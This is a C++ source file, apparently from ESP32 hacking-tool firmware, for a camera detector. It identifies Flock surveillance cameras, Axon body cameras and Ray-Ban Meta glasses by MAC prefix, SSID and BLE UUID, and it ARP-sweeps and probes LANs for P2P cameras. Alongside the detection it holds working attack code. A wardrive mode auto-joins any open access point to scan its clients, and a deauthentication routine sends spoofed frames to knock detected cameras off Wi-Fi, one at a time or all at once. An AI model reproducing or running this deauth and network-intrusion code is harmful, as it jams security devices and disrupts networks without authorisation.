#include "cam_detector.h"
#include "ble_common.h"
#include "camera_brands.h"
#include "tutk_watch.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "esp_wifi.h"
#include "lwip/etharp.h"
#include "lwip/inet.h"
#include "lwip/tcpip.h"
#include "modules/wifi/wifi_atks.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <functional>
#include <globals.h>
#include <vector>

// Defined in modules/wifi/wifi_atks.cpp (not exported in the header).
bool wifi_atk_setWifi();
bool wifi_atk_unsetWifi();

// Detection fingerprints ported from nyanBOX (MIT, (c) 2025 jbohack).
// MAC/OUI prefixes are stored lowercase so they can be compared directly
// against NimBLE/WiFi addresses after lowercasing.

// ---- Flock Safety surveillance cameras --------------------------------------
static const char *const flock_ssid_patterns[] = {
    "flock", "fs ext battery", "penguin", "pigvision"
};
static const char *const flock_mac_prefixes[] = {
    // FS Ext Battery devices
    "58:8e:81", "cc:cc:cc", "ec:1b:bd", "90:35:ea", "04:0d:84",
    "f0:82:c0", "1c:34:f1", "38:5b:44", "94:34:69", "b4:e3:f9",
    // Flock Wi-Fi devices
    "70:c9:4e", "3c:91:80", "d8:f3:bc", "80:30:49", "14:5a:fc",
    "74:4c:a1", "08:3a:88", "9c:2f:9d", "94:08:53", "e4:aa:ea"
};

// ---- Axon (police body cameras) ---------------------------------------------
static const char *const axon_mac_prefixes[] = {"00:25:df"};

// ---- Ray-Ban Meta camera glasses --------------------------------------------
// Identified by the BLE 16-bit service UUID 0xFD5F.
static const char *const rayban_service_uuid = "fd5f";

struct CamDevice {
    String name;
    String address;
    int rssi;
    String method;
    String brand;
};

static String lc(const String &s) {
    String out = s;
    out.toLowerCase();
    return out;
}

template <size_t N>
static bool ouiMatch(const String &macLc, const char *const (&prefixes)[N]) {
    for (size_t i = 0; i < N; i++) {
        if (macLc.startsWith(prefixes[i])) return true;
    }
    return false;
}

template <size_t N>
static bool ssidPatternMatch(const String &ssidLc, const char *const (&patterns)[N]) {
    if (ssidLc.isEmpty()) return false;
    for (size_t i = 0; i < N; i++) {
        if (ssidLc.indexOf(patterns[i]) >= 0) return true;
    }
    return false;
}

static bool deviceHasServiceUUID(const NimBLEAdvertisedDevice *device, const String &needleLc) {
    if (!device->haveServiceUUID()) return false;
    for (size_t i = 0; i < device->getServiceUUIDCount(); i++) {
        if (lc(String(device->getServiceUUID(i).toString().c_str())).indexOf(needleLc) >= 0) return true;
    }
    return false;
}

static void cam_info(const CamDevice &dev) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Camera Device=-", tftWidth / 2, 28, SMOOTH_FONT);
    tft.drawString((dev.brand.isEmpty() ? String("Name: ") : "Brand: " + dev.brand + " ") + dev.name, 10, 48);
    tft.drawString("MAC: " + dev.address, 10, 66);
    tft.drawString("Method: " + dev.method, 10, 84);
    tft.drawString("RSSI: " + String(dev.rssi) + " dBm", 10, 102);
    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);

    delay(300);
    while (!check(SelPress) && !check(EscPress)) yield();
}

// Present the collected matches in the standard Bruce list UI.
static void showResults(const String &title, std::vector<CamDevice> &devices) {
    if (devices.empty()) {
        displayTextLine("No " + title + " found");
        delay(1500);
        return;
    }

    options = {};
    for (auto &dev : devices) {
        CamDevice d = dev; // capture by value
        String label = (d.brand.isEmpty() ? d.name : d.brand) + " (" + String(d.rssi) + ")";
        options.emplace_back(label.c_str(), [d]() { cam_info(d); });
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
    options.clear();
}

// WiFi-side fingerprinting: SSID substrings + BSSID OUI. Used by Flock.
static void scanWiFiFlock(std::vector<CamDevice> &out) {
    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        bool bySsid = ssidPatternMatch(lc(ssid), flock_ssid_patterns);
        bool byMac = ouiMatch(lc(mac), flock_mac_prefixes);
        if (!bySsid && !byMac) continue;
        out.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
                       bySsid ? String("WiFi SSID") : String("WiFi MAC")});
    }
    WiFi.scanDelete();
}

// BLE-side fingerprinting. matcher() returns the detection-method string for a
// matching advertisement, or an empty string to skip it.
static void scanBleMatching(
    std::vector<CamDevice> &out, std::function<String(const NimBLEAdvertisedDevice *)> matcher
) {
    displayTextLine("Scanning BLE..");
    ble_scan_setup();
    BLEScanResults foundDevices = pBLEScan->getResults(scanTime * 1000, false);
    for (int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice *device = foundDevices.getDevice(i);
        String method = matcher(device);
        if (method.isEmpty()) continue;
        String name = String(device->getName().c_str());
        if (name.isEmpty()) name = "<no name>";
        out.push_back({name, String(device->getAddress().toString().c_str()), device->getRSSI(), method});
    }
    pBLEScan->clearResults();
    stopBLEStack();
}

static void flockDetector() {
    std::vector<CamDevice> devices;
    scanWiFiFlock(devices);
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        String name = lc(String(device->getName().c_str()));
        if (ssidPatternMatch(name, flock_ssid_patterns)) return "BLE Name";
        if (ouiMatch(mac, flock_mac_prefixes)) return "BLE MAC";
        return "";
    });
    showResults("Flock", devices);
}

static void axonDetector() {
    std::vector<CamDevice> devices;
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        return ouiMatch(mac, axon_mac_prefixes) ? "BLE MAC" : "";
    });
    showResults("Axon", devices);
}

static void raybanDetector() {
    std::vector<CamDevice> devices;
    String needle = rayban_service_uuid;
    scanBleMatching(devices, [needle](const NimBLEAdvertisedDevice *device) -> String {
        return deviceHasServiceUUID(device, needle) ? "BLE UUID" : "";
    });
    showResults("RayBan", devices);
}

// ---------------------------------------------------------------------------
// P2P LAN Scan: active discovery of iLnkP2P / CS2 Network P2P cameras.
//
// These are the cheap OEM cameras that passive OUI/SSID scanning misses. Once
// joined to a Wi-Fi network we broadcast the LAN-search probe on UDP 32108;
// P2P cameras reply with a packet carrying their UID (PREFIX-serial-check). We
// then ARP-resolve each responder's IP -> MAC so the matching deauther can
// target the camera station directly. Requires being connected to the same
// network as the cameras (active, not passive).
// ---------------------------------------------------------------------------
static const uint16_t P2P_PORT = 32108;      // iLnkP2P / CS2 Yunni LAN search
static const uint16_t P2P_PORT_TUTK = 32100; // TUTK/Kalay master port; legacy
                                             // PPPP-family (pre-hardening) cams
                                             // often still answer LAN search here

struct P2PCam {
    String uid;
    String brand;
    IPAddress ip;
    uint8_t mac[6];
    bool haveMac;
};

// Broadcast the LAN-search probes and collect responders.
static void p2pDiscover(std::vector<P2PCam> &out) {
    WiFiUDP udp;
    if (!udp.begin(P2P_PORT)) {
        // fall back to an ephemeral local port; replies still come to our source
        udp.begin(0);
    }

    const uint8_t probeSearch[4] = {0xF1, 0x30, 0x00, 0x00};    // MSG_LAN_SEARCH
    const uint8_t probeSearchExt[4] = {0xF1, 0x32, 0x00, 0x00}; // MSG_LAN_SEARCH_EXT

    // Tier-1 TUTK: probe the classic iLnkP2P/CS2 port and the TUTK master port.
    // Devices reply to our source port, so the single bound socket catches both.
    const uint16_t dstPorts[2] = {P2P_PORT, P2P_PORT_TUTK};
    for (int r = 0; r < 3; r++) {
        for (uint16_t dp : dstPorts) {
            udp.beginPacket(IPAddress(255, 255, 255, 255), dp);
            udp.write(probeSearch, sizeof(probeSearch));
            udp.endPacket();
            udp.beginPacket(IPAddress(255, 255, 255, 255), dp);
            udp.write(probeSearchExt, sizeof(probeSearchExt));
            udp.endPacket();
        }
        delay(60);
    }

    uint32_t start = millis();
    while (millis() - start < 2500) {
        int len = udp.parsePacket();
        if (len >= 22) {
            uint8_t buf[128];
            int n = udp.read(buf, sizeof(buf));
            IPAddress from = udp.remoteIP();
            // Response magic 0xF1; payload = prefix(8) serial(4 BE) check(6).
            if (n >= 22 && buf[0] == 0xF1) {
                char prefix[9] = {0};
                int pl = 0;
                for (int i = 0; i < 8; i++) {
                    char c = (char)buf[4 + i];
                    if (c >= 'A' && c <= 'Z') prefix[pl++] = c;
                    else break;
                }
                if (pl >= 2) { // looks like a real UID prefix
                    uint32_t serial =
                        ((uint32_t)buf[12] << 24) | (buf[13] << 16) | (buf[14] << 8) | buf[15];
                    char check[7] = {0};
                    for (int i = 0; i < 6; i++) {
                        char c = (char)buf[16 + i];
                        if (c >= 32 && c < 127) check[i] = c;
                        else break; // stop at first non-printable (padding)
                    }
                    char uid[40];
                    snprintf(uid, sizeof(uid), "%s-%06lu-%s", prefix, (unsigned long)serial, check);

                    bool dup = false;
                    for (auto &c : out)
                        if (c.ip == from) {
                            dup = true;
                            break;
                        }
                    if (!dup && out.size() < 64) {
                        // Yunni devices use an [A-F]{5} check code; else CS2.
                        bool yunni = strlen(check) == 5;
                        for (int i = 0; i < (int)strlen(check) && yunni; i++)
                            if (check[i] < 'A' || check[i] > 'F') yunni = false;
                        const char *brand = identifyP2PPrefix(String(prefix));
                        P2PCam cam = {};
                        cam.uid = uid;
                        cam.brand = brand ? brand : (yunni ? "iLnkP2P cam" : "CS2 P2P cam");
                        cam.ip = from;
                        cam.haveMac = false;
                        out.push_back(cam);
                    }
                }
            }
        }
        delay(5);
    }
    udp.stop();
}

// Resolve each camera IP -> station MAC via the lwIP ARP table.
static void p2pResolveMacs(std::vector<P2PCam> &cams) {
    // Nudge ARP resolution the thread-safe way: a unicast datagram to each
    // camera makes lwIP ARP for it through the normal (core-locked) UDP send
    // path, so we avoid calling lwIP internals (etharp_request) from this task.
    WiFiUDP udp;
    udp.begin(0);
    const uint8_t ping[4] = {0xF1, 0x30, 0x00, 0x00};
    for (auto &c : cams) {
        udp.beginPacket(c.ip, P2P_PORT);
        udp.write(ping, sizeof(ping));
        udp.endPacket();
    }
    udp.stop();
    delay(500);

    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ipr = nullptr;
        struct eth_addr *ethr = nullptr;
        struct netif *tif = nullptr;
        if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
        if (!ipr || !ethr) continue;
        for (auto &c : cams) {
            if (!c.haveMac && (uint32_t)c.ip == ipr->addr) {
                memcpy(c.mac, ethr->addr, 6);
                c.haveMac = true;
            }
        }
    }
}

// ===========================================================================
// Camera Radar: unified catch-all detector. Merges every visibility surface -
// Wi-Fi APs, BLE advertisers, and (when on a LAN) ARP hosts + P2P responders -
// against the camera_brands DB, deduped by MAC. Passive by default; Wardrive
// mode also auto-joins open APs to sweep their clients. One deauth path serves
// both "Deauth All" and per-camera "Target Deauth" via the wifi_atks frames.
// ===========================================================================
enum RadarSurface { RS_AP, RS_CLIENT, RS_BLE };

struct RadarCam {
    String brand;
    String name;   // ssid / ble name / p2p uid
    String macStr; // lowercase aa:bb:cc:...
    uint8_t mac[6];
    RadarSurface surface;
    String method;
    int rssi;
    bool haveIp;
    IPAddress ip;
    bool deauthable;    // false for BLE
    uint8_t apBssid[6]; // AP to spoof as source (cam's own AP, or the client's AP)
    uint8_t channel;
};

static std::vector<RadarCam> g_radar;

static uint32_t ipOctetsToU32(const IPAddress &ip) {
    return ((uint32_t)ip[0] << 24) | ((uint32_t)ip[1] << 16) | ((uint32_t)ip[2] << 8) | ip[3];
}

static bool parseMac6(const String &macLc, uint8_t out[6]) {
    return sscanf(
               macLc.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &out[0], &out[1], &out[2], &out[3],
               &out[4], &out[5]
           ) == 6;
}

static void macToStr6(const uint8_t m[6], char *buf) {
    sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static bool radarSeen(const uint8_t mac[6]) {
    for (auto &c : g_radar)
        if (memcmp(c.mac, mac, 6) == 0) return true;
    return false;
}

static void radarAlert(const RadarCam &c) {
    tft.fillScreen(bruceConfig.priColor);
    delay(70);
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Camera Found");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, 40);
    const char *s = c.surface == RS_AP ? "AP" : c.surface == RS_CLIENT ? "client" : "BLE";
    padprintln(" " + c.brand);
    padprintln(" " + c.name);
    padprintln(" " + c.macStr);
    padprintln(String(" ") + s + "  " + c.method);
    delay(1000);
}

// --- surface collectors -----------------------------------------------------

static void radarScanAPs(bool alert) {
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = lc(WiFi.BSSIDstr(i));
        const char *method = nullptr;
        const char *brand = identifyCamera(mac, lc(ssid), &method);
        if (!brand) continue;
        uint8_t mb[6];
        if (!parseMac6(mac, mb) || radarSeen(mb)) continue;
        RadarCam c = {};
        c.brand = brand;
        c.name = ssid.isEmpty() ? String("<hidden>") : ssid;
        c.macStr = mac;
        memcpy(c.mac, mb, 6);
        c.surface = RS_AP;
        c.method = String("AP ") + method;
        c.rssi = WiFi.RSSI(i);
        c.deauthable = true;
        memcpy(c.apBssid, WiFi.BSSID(i), 6);
        c.channel = (uint8_t)WiFi.channel(i);
        g_radar.push_back(c);
        if (alert) radarAlert(g_radar.back());
    }
    WiFi.scanDelete();
}

static void radarScanBLE(bool alert) {
    ble_scan_setup();
    BLEScanResults found = pBLEScan->getResults(scanTime * 1000, false);
    for (int i = 0; i < found.getCount(); i++) {
        const NimBLEAdvertisedDevice *d = found.getDevice(i);
        String mac = lc(String(d->getAddress().toString().c_str()));
        String name = String(d->getName().c_str());
        const char *method = nullptr;
        const char *brand = identifyCamera(mac, lc(name), &method);
        String reason;
        if (brand) {
            reason = String("BLE ") + method;
        } else if (deviceHasServiceUUID(d, String(rayban_service_uuid))) {
            brand = "RayBan";
            reason = "BLE UUID";
        }
        if (!brand) continue;
        uint8_t mb[6];
        if (!parseMac6(mac, mb) || radarSeen(mb)) continue;
        RadarCam c = {};
        c.brand = brand;
        c.name = name.isEmpty() ? String("<no name>") : name;
        c.macStr = mac;
        memcpy(c.mac, mb, 6);
        c.surface = RS_BLE;
        c.method = reason;
        c.rssi = d->getRSSI();
        c.deauthable = false;
        g_radar.push_back(c);
        if (alert) radarAlert(g_radar.back());
    }
    pBLEScan->clearResults();
    stopBLEStack();
}

static struct netif *radarStaNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return nullptr;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

// Diagnostic: total unique LAN hosts the last ARP sweep resolved (cameras or
// not). 0-1 means station-to-station ARP is blocked (client isolation / wrong
// subnet), not a detection bug.
static int g_lanHostsSeen = 0;

// On the currently-joined LAN: ARP-sweep + P2P probe -> camera client stations.
static void radarScanLan(bool alert) {
    if (WiFi.status() != WL_CONNECTED) return;
    struct netif *nif = radarStaNetif();
    uint8_t curBssid[6];
    memcpy(curBssid, WiFi.BSSID(), 6);
    uint8_t curCh = (uint8_t)WiFi.channel();

    uint32_t myHost = ipOctetsToU32(WiFi.localIP());
    uint32_t maskHost = ipOctetsToU32(WiFi.subnetMask());
    uint32_t netHost = myHost & maskHost;
    uint32_t bcastHost = netHost | (~maskHost);
    uint32_t first = netHost + 1;
    uint32_t last = (bcastHost > netHost) ? bcastHost - 1 : netHost;
    if (last > first + 1021) last = first + 1021;

    std::vector<String> hostMacs; // every LAN host resolved (dedup) - diagnostic
    auto harvest = [&]() {
        for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ipr = nullptr;
            struct eth_addr *ethr = nullptr;
            struct netif *tif = nullptr;
            if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
            if (!ipr || !ethr) continue;
            char macs[18];
            macToStr6(ethr->addr, macs);
            String mac = macs;
            bool knownHost = false;
            for (auto &hm : hostMacs)
                if (hm == mac) {
                    knownHost = true;
                    break;
                }
            if (!knownHost) hostMacs.push_back(mac);
            const char *method = nullptr;
            const char *brand = identifyCamera(mac, String(""), &method);
            if (!brand || radarSeen(ethr->addr)) continue;
            RadarCam c = {};
            c.brand = brand;
            c.name = IPAddress(ipr->addr).toString();
            c.macStr = mac;
            memcpy(c.mac, ethr->addr, 6);
            c.surface = RS_CLIENT;
            c.method = "LAN OUI";
            c.haveIp = true;
            c.ip = IPAddress(ipr->addr);
            c.deauthable = true;
            memcpy(c.apBssid, curBssid, 6);
            c.channel = curCh;
            g_radar.push_back(c);
            if (alert) radarAlert(g_radar.back());
        }
    };
    // Use the proven ARP-request path (as netcut) rather than UDP pings. The
    // ESP32 ARP table is tiny (~10 entries), so harvest after every request so a
    // resolved host is read within its own window before later requests evict it.
    for (uint32_t h = first; h <= last && !check(EscPress); h++) {
        if (h == myHost) continue;
        if (nif) {
            ip4_addr_t target;
            target.addr = htonl(h);
            LOCK_TCPIP_CORE();
            etharp_request(nif, &target);
            UNLOCK_TCPIP_CORE();
        }
        delay(8);
        harvest();
    }
    delay(300);
    harvest();
    g_lanHostsSeen = (int)hostMacs.size();

    // P2P responders (UID as name).
    std::vector<P2PCam> p2p;
    p2pDiscover(p2p);
    p2pResolveMacs(p2p);
    for (auto &pc : p2p) {
        if (!pc.haveMac || radarSeen(pc.mac)) continue;
        RadarCam c = {};
        c.brand = pc.brand;
        c.name = pc.uid;
        char ms[18];
        macToStr6(pc.mac, ms);
        c.macStr = ms;
        memcpy(c.mac, pc.mac, 6);
        c.surface = RS_CLIENT;
        c.method = "P2P";
        c.haveIp = true;
        c.ip = pc.ip;
        c.deauthable = true;
        memcpy(c.apBssid, curBssid, 6);
        c.channel = curCh;
        g_radar.push_back(c);
        if (alert) radarAlert(g_radar.back());
    }
}

// --- deauth -----------------------------------------------------------------
// AP cams: broadcast-deauth their clients. Client cams: targeted station deauth
// from the AP they are on. Unified through wsl_bypasser (APSTA, per-target chan).
static void radarDeauth(int onlyIndex) {
    int n = 0;
    for (size_t i = 0; i < g_radar.size(); i++)
        if (g_radar[i].deauthable && (onlyIndex < 0 || (int)i == onlyIndex)) n++;
    if (n == 0) {
        displayTextLine("No deauthable target");
        delay(1500);
        return;
    }
    if (!wifi_atk_setWifi()) return;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    uint32_t lastTime = millis();
    uint16_t count = 0;
    drawMainBorderWithTitle("Cam Deauth");
    tft.setCursor(10, 60);
    tft.println(String(n) + " target(s)");
    while (!check(EscPress)) {
        for (size_t i = 0; i < g_radar.size(); i++) {
            RadarCam &c = g_radar[i];
            if (!c.deauthable || (onlyIndex >= 0 && (int)i != onlyIndex)) continue;
            wifi_ap_record_t rec;
            memset(&rec, 0, sizeof(rec));
            memcpy(rec.bssid, c.apBssid, 6);
            rec.primary = c.channel;
            const uint8_t *target = (c.surface == RS_AP) ? _default_target : c.mac;
            wsl_bypasser_send_raw_frame(&rec, c.channel, target);
            for (int k = 0; k < 40; k++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Cam Deauth");
            tft.setCursor(10, 60);
            tft.println(String(n) + " target(s)");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            count = 0;
            lastTime = millis();
        }
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

// --- results UI -------------------------------------------------------------
static void radarInfo(const RadarCam &c) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Camera=-", tftWidth / 2, 24, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.setCursor(8, 42);
    const char *s = c.surface == RS_AP ? "AP" : c.surface == RS_CLIENT ? "client" : "BLE";
    padprintln(" Brand:  " + c.brand);
    padprintln(" Name:   " + c.name);
    padprintln(" MAC:    " + c.macStr);
    if (c.haveIp) padprintln(" IP:     " + c.ip.toString());
    padprintln(String(" Seen:   ") + s);
    padprintln(" Method: " + c.method);
    if (c.surface != RS_BLE) padprintln(" Chan:   " + String(c.channel));
    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 18, 1);
    delay(300);
    while (!check(SelPress) && !check(EscPress)) yield();
}

static void radarCamMenu(int idx) {
    RadarCam c = g_radar[idx];
    options = {};
    options.push_back({"Info", [c]() { radarInfo(c); }});
    if (c.deauthable) options.push_back({"Target Deauth", [idx]() { radarDeauth(idx); }});
    options.push_back({"Back", []() {}});
    loopOptions(options, MENU_TYPE_SUBMENU, c.brand.c_str());
    options.clear();
}

static void radarResults() {
    if (g_radar.empty()) {
        displayTextLine("No cameras found");
        delay(1500);
        return;
    }
    options = {};
    options.push_back({"Deauth ALL", []() { radarDeauth(-1); }});
    for (size_t i = 0; i < g_radar.size(); i++) {
        int idx = (int)i;
        const char *tag = g_radar[i].surface == RS_BLE   ? "[B]"
                          : g_radar[i].surface == RS_AP  ? "[AP]"
                                                         : "[LAN]";
        String label = g_radar[i].brand + " " + tag;
        options.push_back({label.c_str(), [idx]() { radarCamMenu(idx); }});
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Cameras");
    options.clear();
}

// --- wardrive on-screen exit control ---------------------------------------
// Touch devices (e.g. CYD) never map a tap to EscPress and can't interrupt the
// blocking Wi-Fi/BLE scans, so wardrive draws a top-left [X]: solid = tap to
// stop now; greyed = a scan is running and the stop registers right after.
static const int RADAR_XBOX_X = 6, RADAR_XBOX_Y = 4, RADAR_XBOX_W = 30, RADAR_XBOX_H = 26;

static bool radarExitTapped() {
    if (check(EscPress)) return true; // physical Esc/back on button devices
    if (touchPoint.pressed) {
        bool in = touchPoint.x >= RADAR_XBOX_X && touchPoint.x <= RADAR_XBOX_X + RADAR_XBOX_W &&
                  touchPoint.y >= RADAR_XBOX_Y && touchPoint.y <= RADAR_XBOX_Y + RADAR_XBOX_H;
        touchPoint.Clear();
        AnyKeyPress = false;
        return in;
    }
    return false;
}

static void radarWardriveScreen(const String &phase, bool exitActive, int round) {
    drawMainBorderWithTitle("Wardrive");
    uint16_t xcol = exitActive ? bruceConfig.priColor : tft.color565(96, 96, 96);
    tft.drawRoundRect(RADAR_XBOX_X, RADAR_XBOX_Y, RADAR_XBOX_W, RADAR_XBOX_H, 4, xcol);
    tft.setTextColor(xcol, bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setCursor(RADAR_XBOX_X + 8, RADAR_XBOX_Y + 6);
    tft.print("X");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, 44);
    padprintln(" " + phase);
    padprintln(" Cameras: " + String((int)g_radar.size()));
    padprintln(" Rounds:  " + String(round));
    padprintln(exitActive ? " Tap X to stop" : " Scanning - please wait");
}

static void cameraRadar() {
    bool wardrive = false;
    bool cancelled = true;
    options = {
        {"Passive scan",  [&]() { wardrive = false; cancelled = false; }},
        {"Wardrive mode", [&]() { wardrive = true;  cancelled = false; }},
    };
    loopOptions(options, MENU_TYPE_SUBMENU, "Camera Radar");
    options.clear();
    if (cancelled) return;

    g_radar.clear();

    if (!wardrive) {
        // Passive: a single pass over every surface.
        displayTextLine("Scanning APs..");
        radarScanAPs(false);
        displayTextLine("Scanning BLE..");
        radarScanBLE(false);
        // On-LAN detection needs a joined network; prompt once (this is how a
        // client-only cam like Meari gets caught).
        if (WiFi.status() != WL_CONNECTED) wifiConnectMenu(WIFI_MODE_STA);
        if (WiFi.status() == WL_CONNECTED) {
            displayTextLine("Scanning LAN..");
            radarScanLan(false);
            // Diagnostic: if 0-1 hosts were reachable, station-to-station ARP is
            // blocked (client isolation / IoT subnet), not a detection failure.
            drawMainBorderWithTitle("LAN Scan");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(6, 40);
            padprintln(" LAN hosts seen: " + String(g_lanHostsSeen));
            padprintln(" Cameras so far: " + String((int)g_radar.size()));
            if (g_lanHostsSeen <= 1) padprintln(" (client isolation?)");
            delay(2600);
        }
    } else {
        // Wardrive: keep sweeping every surface until the user exits. Only new
        // (deduped) cameras flash an alert. The [X] is greyed while a scan is
        // running (exit registers right after) and solid in the idle window.
        uint16_t round = 0;
        bool stop = false;
        radarWardriveScreen("Starting...", false, 0); // immediate feedback, no blank hang
        while (!stop) {
            round++;
            radarWardriveScreen("Scanning APs", false, round);
            radarScanAPs(true);
            if (radarExitTapped()) break;

            radarWardriveScreen("Scanning BLE", false, round);
            radarScanBLE(true);
            if (radarExitTapped()) break;

            if (WiFi.status() == WL_CONNECTED) {
                radarWardriveScreen("Sweeping LAN", false, round);
                radarScanLan(true);
                if (radarExitTapped()) break;
            }

            // Auto-join each open AP and sweep its clients.
            radarWardriveScreen("Finding open APs", false, round);
            std::vector<String> openSsids;
            int nets = WiFi.scanNetworks(false, true);
            for (int i = 0; i < nets; i++) {
                if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN && !WiFi.SSID(i).isEmpty())
                    openSsids.push_back(WiFi.SSID(i));
            }
            WiFi.scanDelete();
            for (auto &ssid : openSsids) {
                if (radarExitTapped()) {
                    stop = true;
                    break;
                }
                radarWardriveScreen("Join " + ssid.substring(0, 12), false, round);
                WiFi.begin(ssid.c_str());
                uint32_t t0 = millis();
                while (WiFi.status() != WL_CONNECTED && millis() - t0 < 5000) {
                    if (radarExitTapped()) {
                        stop = true;
                        break;
                    }
                    delay(80);
                }
                if (!stop && WiFi.status() == WL_CONNECTED && (uint32_t)WiFi.localIP() != 0)
                    radarScanLan(true);
                WiFi.disconnect(false);
                delay(50);
                if (stop) break;
            }
            if (stop) break;

            // Idle window: exit is responsive here (solid X).
            radarWardriveScreen("Idle", true, round);
            uint32_t until = millis() + 2000;
            while (millis() < until) {
                if (radarExitTapped()) {
                    stop = true;
                    break;
                }
                delay(40);
            }
        }
    }

    radarResults();
}

void camDetectorMenu() {
    options = {
        {"Camera Radar",    cameraRadar               },
        {"TUTK Watch",      tutkWatch                 },
        {"Flock Detector",  flockDetector             },
        {"Axon Detector",   axonDetector              },
        {"RayBan Detector", raybanDetector            },
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Cam Detector");
    options.clear();
}
